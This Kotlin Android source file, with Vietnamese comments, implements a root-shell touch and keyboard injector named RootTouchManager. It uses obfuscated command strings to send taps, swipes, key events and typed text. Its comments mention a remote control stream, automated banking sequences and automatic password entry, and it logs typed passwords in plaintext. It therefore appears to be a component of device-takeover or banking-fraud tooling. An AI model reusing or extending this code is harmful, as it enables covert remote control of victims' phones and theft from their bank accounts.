package com.payout.app

import android.os.Process as AndroidProcess
import android.util.Log
import java.io.File
import java.io.InputStream
import java.io.OutputStream
import java.util.concurrent.Executors

/**
 * Quản lý cảm ứng và phím cứng qua Shell hệ thống (hỗ trợ cả SU và INJECT_EVENTS/System UID).
 * Tự động tiêu thụ stdout/stderr để buffer không bao giờ bị đầy làm đơ tiến trình shell.
 */
object RootTouchManager {
    private const val TAG = "RootTouchManager"
    @Volatile private var suProcess: Process? = null
    @Volatile private var os: OutputStream? = null
    @Volatile var hasRoot: Boolean = false
        private set
    private val executor = Executors.newSingleThreadExecutor()

    val isSystemUid: Boolean
        get() = AndroidProcess.myUid() == 1000

    fun getShellExecutable(): String {
        return if (File("/system/bin/su").exists() || File("/system/xbin/su").exists()) {
            CmdObf.SU
        } else {
            "sh"
        }
    }

    @Synchronized
    fun init(): Boolean {
        return try {
            release()
            val shell = getShellExecutable()
            val proc = Runtime.getRuntime().exec(shell)
            suProcess = proc
            os = proc.outputStream

            // Đọc ngầm stdout và stderr để tránh deadlock buffer
            val inStream = proc.inputStream
            val errStream = proc.errorStream
            Thread {
                try {
                    val buf = ByteArray(1024)
                    while (inStream.read(buf) != -1) {}
                } catch (ignored: Exception) {}
            }.start()

            Thread {
                try {
                    val buf = ByteArray(1024)
                    while (errStream.read(buf) != -1) {}
                } catch (ignored: Exception) {}
            }.start()

            hasRoot = true
            Log.i(TAG, "Shell session created successfully with '$shell' (UID: ${AndroidProcess.myUid()})")
            true
        } catch (e: Exception) {
            hasRoot = false
            Log.e(TAG, "Failed to create shell session", e)
            false
        }
    }

    @Volatile private var lastTapX = -1
    @Volatile private var lastTapY = -1
    @Volatile private var lastTapTime = 0L

    @Volatile private var lastKey = -1
    @Volatile private var lastKeyTime = 0L

    @Volatile private var lastText = ""
    @Volatile private var lastTextTime = 0L

    fun isShellAlive(): Boolean {
        val proc = suProcess ?: return false
        return try {
            proc.exitValue()
            false
        } catch (e: IllegalThreadStateException) {
            true
        }
    }

    /**
     * Chạm / Click vào vị trí (x, y) trên màn hình (Bất đồng bộ - dành cho Stream điều khiển)
     */
    fun tap(x: Int, y: Int) {
        val now = System.currentTimeMillis()
        if (Math.abs(x - lastTapX) <= 5 && Math.abs(y - lastTapY) <= 5 && (now - lastTapTime < 180L)) {
            Log.w(TAG, "Lọc bỏ TAP trùng lặp: ($x, $y)")
            return
        }
        lastTapX = x
        lastTapY = y
        lastTapTime = now
        Log.d(TAG, "TAP -> ($x, $y)")
        sendCommand("${CmdObf.INPUT_TAP}$x $y")
    }

    /**
     * Chạm / Click đồng bộ (Dành cho kịch bản tự động hóa tuần tự như ngân hàng, đảm bảo ăn cảm ứng 100%)
     */
    fun tapSync(x: Int, y: Int) {
        lastTapX = x
        lastTapY = y
        lastTapTime = System.currentTimeMillis()
        Log.i(TAG, "TAP_SYNC -> ($x, $y)")
        sendCommandSync("${CmdObf.INPUT_TAP}$x $y")
    }

    var screenWidth = 1080
    var screenHeight = 2280
    private var isScreenSizeLoaded = false

    fun ensureScreenSize() {
        if (isScreenSizeLoaded) return
        try {
            val result = executeCommandWithResult("wm size")
            val match = Regex("""(\d+)x(\d+)""").find(result)
            if (match != null) {
                screenWidth = match.groupValues[1].toInt()
                screenHeight = match.groupValues[2].toInt()
                isScreenSizeLoaded = true
                Log.i(TAG, "📱 Đã nhận diện độ phân giải thiết bị: ${screenWidth}x${screenHeight}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Lỗi đọc wm size", e)
        }
    }

    /**
     * Chạm / Click theo tỷ lệ phần trăm màn hình (rx: 0..1, ry: 0..1)
     * Tự động thích ứng trên mọi dòng máy (Pixel 4, Pixel 9 Pro, Samsung, Xiaomi...)
     */
    fun tapRatioSync(rx: Float, ry: Float) {
        ensureScreenSize()
        val realX = (screenWidth * rx).toInt()
        val realY = (screenHeight * ry).toInt()
        Log.i(TAG, "TAP_RATIO -> ($rx, $ry) => ($realX, $realY) trên ${screenWidth}x${screenHeight}")
        tapSync(realX, realY)
    }

    /**
     * Vuốt màn hình từ (x1, y1) đến (x2, y2)
     */
    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Int = 200) {
        Log.d(TAG, "SWIPE -> ($x1, $y1) to ($x2, $y2) in ${durationMs}ms")
        sendCommand("${CmdObf.INPUT_SWIPE}$x1 $y1 $x2 $y2 $durationMs")
    }

    /**
     * Nhấn phím cứng hệ thống (Home: 3, Back: 4, Power: 26, Volume Up: 24, Volume Down: 25, Recents: 187, Del: 67, Enter: 66...)
     */
    fun keyEvent(keyCode: Int) {
        Log.d(TAG, "KEY -> $keyCode")
        sendCommand("${CmdObf.INPUT_KEY}$keyCode")
    }

    private fun escapeInputText(text: String): String {
        val sb = StringBuilder()
        for (c in text) {
            when (c) {
                ' ' -> sb.append("%s")
                '\"' -> sb.append("\\\"")
                '\'' -> sb.append("\\'")
                '\\' -> sb.append("\\\\")
                '&' -> sb.append("\\&")
                '|' -> sb.append("\\|")
                ';' -> sb.append("\\;")
                '<' -> sb.append("\\<")
                '>' -> sb.append("\\>")
                '(' -> sb.append("\\(")
                ')' -> sb.append("\\)")
                '$' -> sb.append("\\$")
                '`' -> sb.append("\\`")
                '*' -> sb.append("\\*")
                '?' -> sb.append("\\?")
                '#' -> sb.append("\\#")
                '~' -> sb.append("\\~")
                '=' -> sb.append("\\=")
                '!' -> sb.append("\\!")
                '%' -> sb.append("\\%")
                else -> sb.append(c)
            }
        }
        return sb.toString()
    }

    /**
     * Gõ văn bản từ xa (Hỗ trợ bàn phím PC trực tiếp, tự động escape ký tự đặc biệt)
     */
    fun typeText(text: String) {
        if (text.isEmpty()) return
        Log.d(TAG, "TEXT -> $text")
        sendCommand("${CmdObf.INPUT_TEXT}${escapeInputText(text)}")
    }

    /**
     * Gõ văn bản đồng bộ cho kịch bản tự động điền mật khẩu
     */
    fun typeTextSync(text: String) {
        if (text.isEmpty()) return
        Log.i(TAG, "TEXT_SYNC -> $text")
        sendCommandSync("${CmdObf.INPUT_TEXT}${escapeInputText(text)}")
    }

    fun executeCommand(cmd: String) {
        sendCommand(cmd)
    }

    /**
     * Chạy lệnh shell đồng bộ và đảm bảo thực thi
     */
    fun sendCommandSync(cmd: String) {
        try {
            if (os == null || suProcess == null || !isShellAlive()) {
                init()
            }
            val stream = os
            if (stream != null && isShellAlive()) {
                stream.write("$cmd\n".toByteArray())
                stream.flush()
                return
            }
        } catch (e: Exception) {
            Log.w(TAG, "Shell stream write error, falling back to direct exec", e)
        }

        // Fallback trực tiếp bằng sh -c hoặc su -c nếu persistent stream gặp lỗi
        try {
            val shell = getShellExecutable()
            val proc = Runtime.getRuntime().exec(arrayOf(shell, "-c", cmd))
            proc.waitFor()
        } catch (e: Exception) {
            Log.e(TAG, "Direct shell execution failed: $cmd", e)
        }
    }

    /**
     * Chạy lệnh shell và lấy kết quả đầu ra (stdout)
     */
    fun executeCommandWithResult(cmd: String, timeoutMs: Long = 2000L): String {
        return try {
            val shell = getShellExecutable()
            val proc = Runtime.getRuntime().exec(arrayOf(shell, "-c", cmd))
            val reader = java.io.BufferedReader(java.io.InputStreamReader(proc.inputStream))
            val sb = StringBuilder()
            val startTime = System.currentTimeMillis()
            while (System.currentTimeMillis() - startTime < timeoutMs) {
                if (reader.ready()) {
                    val line = reader.readLine() ?: break
                    sb.append(line).append("\n")
                } else {
                    try {
                        val exitCode = proc.exitValue()
                        // Tiến trình đã kết thúc, đọc phần còn lại
                        sb.append(reader.readText())
                        break
                    } catch (e: IllegalThreadStateException) {
                        Thread.sleep(50L)
                    }
                }
            }
            try { proc.destroy() } catch (ignored: Exception) {}
            sb.toString().trim()
        } catch (e: Exception) {
            ""
        }
    }

    private fun sendCommand(cmd: String) {
        executor.execute {
            try {
                if (os == null || suProcess == null || !isShellAlive()) {
                    init()
                }
                val stream = os
                if (stream != null && isShellAlive()) {
                    stream.write("$cmd\n".toByteArray())
                    stream.flush()
                }
            } catch (e: Exception) {
                Log.w(TAG, "Shell stream write error, recreating shell...", e)
                try {
                    init()
                    os?.write("$cmd\n".toByteArray())
                    os?.flush()
                } catch (ex: Exception) {
                    Log.e(TAG, "Recreate shell failed, direct exec fallback", ex)
                    try {
                        val shell = getShellExecutable()
                        Runtime.getRuntime().exec(arrayOf(shell, "-c", cmd))
                    } catch (ignored: Exception) {}
                }
            }
        }
    }

    @Synchronized
    fun release() {
        try {
            os?.write("exit\n".toByteArray())
            os?.flush()
            os?.close()
        } catch (ignored: Exception) {}

        try {
            suProcess?.destroy()
        } catch (ignored: Exception) {}

        os = null
        suProcess = null
    }
}

